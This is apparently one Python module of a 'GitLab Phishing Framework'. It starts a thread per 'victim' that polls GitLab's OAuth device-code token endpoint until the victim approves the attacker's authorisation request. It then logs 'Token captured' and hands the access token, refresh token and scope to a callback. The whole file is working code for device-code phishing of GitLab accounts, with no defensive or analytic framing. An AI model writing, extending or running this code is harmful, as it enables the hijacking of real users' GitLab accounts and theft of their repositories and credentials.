"""
Token Poller module for the GitLab Phishing Framework.
Handles continuous polling of GitLab OAuth token endpoint until authorization is granted.
"""

import logging
import requests
import threading
import time
from typing import Callable, Dict, Optional


from ..interfaces import TokenPollerInterface, OperationResult
from ..models import Config


logger = logging.getLogger(__name__)


class TokenPoller(TokenPollerInterface):
    """
    Token Poller module that polls GitLab OAuth token endpoint.
    
    Creates a separate thread for each victim to continuously poll
    the token endpoint until authorization is granted, denied, or expired.
    """
    
    def __init__(self, config: Config):
        """
        Initialize Token Poller.
        
        Args:
            config: Framework configuration
        """
        self.config = config
        self.token_callback: Optional[Callable] = None
        
        # Dictionary to track active polling threads
        # Key: (operation_id, victim_id), Value: thread object
        self._polling_threads: Dict[tuple, threading.Thread] = {}
        
        # Dictionary to track stop flags for threads
        # Key: (operation_id, victim_id), Value: threading.Event
        self._stop_flags: Dict[tuple, threading.Event] = {}
        
        # Lock for thread-safe operations
        self._lock = threading.Lock()
        
        logger.info("TokenPoller initialized")
    
    def start_polling(self, operation_id: int, victim_id: int, 
                     device_code: str, base_url: str, 
                     client_id: str, interval: int) -> OperationResult:
        """
        Start polling for token authorization.
        
        Creates a new thread that continuously polls the GitLab token endpoint
        until the device code is authorized, denied, or expired.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            device_code: Device code to poll for
            base_url: GitLab instance base URL
            client_id: OAuth application client ID
            interval: Polling interval in seconds (from GitLab response)
            
        Returns:
            OperationResult indicating polling started
        """
        thread_key = (operation_id, victim_id)
        
        with self._lock:
            # Check if already polling for this victim
            if thread_key in self._polling_threads:
                existing_thread = self._polling_threads[thread_key]
                if existing_thread.is_alive():
                    logger.warning(
                        f"Already polling for operation {operation_id}, "
                        f"victim {victim_id}"
                    )
                    return OperationResult(
                        success=False,
                        error="Already polling for this victim"
                    )
            
            # Create stop flag for this thread
            stop_flag = threading.Event()
            self._stop_flags[thread_key] = stop_flag
            
            # Create and start polling thread
            thread = threading.Thread(
                target=self._poll_token,
                args=(operation_id, victim_id, device_code, base_url, 
                      client_id, interval, stop_flag),
                name=f"TokenPoller-{operation_id}-{victim_id}",
                daemon=True
            )
            
            self._polling_threads[thread_key] = thread
            thread.start()
            
            logger.info(
                f"Started polling for operation {operation_id}, "
                f"victim {victim_id} (interval: {interval}s)"
            )
            
            return OperationResult(
                success=True,
                message=f"Polling started for victim {victim_id}"
            )
    
    def stop_polling(self, operation_id: int, victim_id: int) -> OperationResult:
        """
        Stop polling for a specific victim.
        
        Sets the stop flag for the polling thread and waits for it to terminate.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            
        Returns:
            OperationResult indicating polling stopped
        """
        thread_key = (operation_id, victim_id)
        
        with self._lock:
            # Check if thread exists
            if thread_key not in self._polling_threads:
                logger.warning(
                    f"No polling thread found for operation {operation_id}, "
                    f"victim {victim_id}"
                )
                return OperationResult(
                    success=False,
                    error="No polling thread found for this victim"
                )
            
            # Set stop flag
            if thread_key in self._stop_flags:
                self._stop_flags[thread_key].set()
            
            thread = self._polling_threads[thread_key]
        
        # Wait for thread to finish (with timeout)
        thread.join(timeout=5.0)
        
        with self._lock:
            # Clean up
            if thread_key in self._polling_threads:
                del self._polling_threads[thread_key]
            if thread_key in self._stop_flags:
                del self._stop_flags[thread_key]
        
        logger.info(
            f"Stopped polling for operation {operation_id}, victim {victim_id}"
        )
        
        return OperationResult(
            success=True,
            message=f"Polling stopped for victim {victim_id}"
        )
    
    def set_token_callback(self, callback: Callable) -> None:
        """
        Set callback function to be called when token is captured.
        
        The callback should accept: (operation_id, victim_id, access_token, scope)
        
        Args:
            callback: Function to call with token information
        """
        self.token_callback = callback
        logger.debug("Token callback set")
    
    def _poll_token(self, operation_id: int, victim_id: int, 
                   device_code: str, base_url: str, 
                   client_id: str, interval: int,
                   stop_flag: threading.Event) -> None:
        """
        Internal method that performs the actual polling.
        
        Runs in a separate thread and continuously polls the token endpoint
        until authorization is granted, denied, expired, or stop flag is set.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            device_code: Device code to poll for
            base_url: GitLab instance base URL
            client_id: OAuth application client ID
            interval: Polling interval in seconds
            stop_flag: Threading event to signal stop
        """
        # Ensure base_url doesn't have trailing slash
        base_url = base_url.rstrip('/')
        token_url = f"{base_url}/oauth/token"
        
        # Calculate timeout based on config
        start_time = time.time()
        timeout = self.config.polling_timeout
        
        logger.info(
            f"Starting token polling for victim {victim_id} "
            f"(timeout: {timeout}s, interval: {interval}s)"
        )
        
        retry_count = 0
        
        while not stop_flag.is_set():
            # Check if timeout exceeded
            elapsed = time.time() - start_time
            if elapsed >= timeout:
                logger.warning(
                    f"Polling timeout exceeded for victim {victim_id} "
                    f"({elapsed:.1f}s)"
                )
                break
            
            try:
                # Make POST request to token endpoint
                response = requests.post(
                    token_url,
                    data={
                        'client_id': client_id,
                        'device_code': device_code,
                        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
                    },
                    headers={
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    timeout=self.config.api_timeout,
                    verify=self.config.verify_ssl
                )
                
                # Handle different response scenarios
                if response.status_code == 200:
                    # Success - token granted
                    token_data = response.json()
                    access_token = token_data.get('access_token')
                    refresh_token = token_data.get('refresh_token')
                    # token_type = token_data.get('token_type', 'Bearer')  # Unused
                    scope = token_data.get('scope', '')
                    expires_in = token_data.get('expires_in')
                    
                    logger.info(
                        f"Token captured for victim {victim_id}! "
                        f"Scope: {scope}, Has refresh_token: {refresh_token is not None}"
                    )
                    
                    # Call callback if set
                    if self.token_callback:
                        try:
                            self.token_callback(
                                operation_id, 
                                victim_id, 
                                access_token,
                                refresh_token,
                                scope,
                                expires_in
                            )
                        except Exception as e:
                            logger.error(
                                f"Error in token callback: {e}", 
                                exc_info=True
                            )
                    
                    # Stop polling - success
                    break
                
                elif response.status_code == 400:
                    # Check error type
                    error_data = response.json()
                    error = error_data.get('error', '')
                    
                    if error == 'authorization_pending':
                        # Still waiting for user authorization - continue polling
                        logger.debug(
                            f"Authorization pending for victim {victim_id}, "
                            f"continuing to poll..."
                        )
                        retry_count = 0  # Reset retry count on successful request
                    
                    elif error == 'expired_token':
                        # Device code expired
                        logger.warning(
                            f"Device code expired for victim {victim_id}"
                        )
                        break
                    
                    elif error == 'access_denied':
                        # User denied authorization
                        logger.info(
                            f"Authorization denied by victim {victim_id}"
                        )
                        break
                    
                    elif error == 'slow_down':
                        # Polling too fast - increase interval
                        logger.warning(
                            f"Slow down requested for victim {victim_id}, "
                            f"increasing interval"
                        )
                        interval = min(interval + 5, 30)  # Cap at 30 seconds
                    
                    else:
                        # Unknown error
                        logger.error(
                            f"Unknown error for victim {victim_id}: {error}"
                        )
                        break
                
                else:
                    # Unexpected status code
                    logger.error(
                        f"Unexpected response status {response.status_code} "
                        f"for victim {victim_id}: {response.text}"
                    )
                    retry_count += 1
                    
                    if retry_count >= self.config.max_retries:
                        logger.error(
                            f"Max retries exceeded for victim {victim_id}"
                        )
                        break
            
            except requests.exceptions.Timeout:
                logger.warning(
                    f"Request timeout for victim {victim_id}, retrying..."
                )
                retry_count += 1
                
                if retry_count >= self.config.max_retries:
                    logger.error(
                        f"Max retries exceeded for victim {victim_id} "
                        f"(timeout)"
                    )
                    break
            
            except requests.exceptions.ConnectionError:
                logger.error(
                    f"Connection error for victim {victim_id}, retrying..."
                )
                retry_count += 1
                
                if retry_count >= self.config.max_retries:
                    logger.error(
                        f"Max retries exceeded for victim {victim_id} "
                        f"(connection error)"
                    )
                    break
            
            except Exception as e:
                logger.error(
                    f"Unexpected error polling for victim {victim_id}: {e}",
                    exc_info=True
                )
                break
            
            # Wait for the specified interval before next poll
            # Use wait() instead of sleep() so we can be interrupted by stop_flag
            if stop_flag.wait(timeout=interval):
                # Stop flag was set
                logger.info(f"Polling stopped by flag for victim {victim_id}")
                break
        
        # Clean up thread references
        thread_key = (operation_id, victim_id)
        with self._lock:
            if thread_key in self._polling_threads:
                del self._polling_threads[thread_key]
            if thread_key in self._stop_flags:
                del self._stop_flags[thread_key]
        
        logger.info(f"Polling thread finished for victim {victim_id}")
    
    def get_active_polls(self) -> Dict[tuple, bool]:
        """
        Get information about active polling threads.
        
        Returns:
            Dictionary mapping (operation_id, victim_id) to thread alive status
        """
        with self._lock:
            return {
                key: thread.is_alive() 
                for key, thread in self._polling_threads.items()
            }
    
    def stop_all_polling(self) -> None:
        """
        Stop all active polling threads.
        
        Useful for cleanup when shutting down the framework.
        """
        with self._lock:
            thread_keys = list(self._polling_threads.keys())
        
        logger.info(f"Stopping all polling threads ({len(thread_keys)} active)")
        
        for operation_id, victim_id in thread_keys:
            self.stop_polling(operation_id, victim_id)
        
        logger.info("All polling threads stopped")
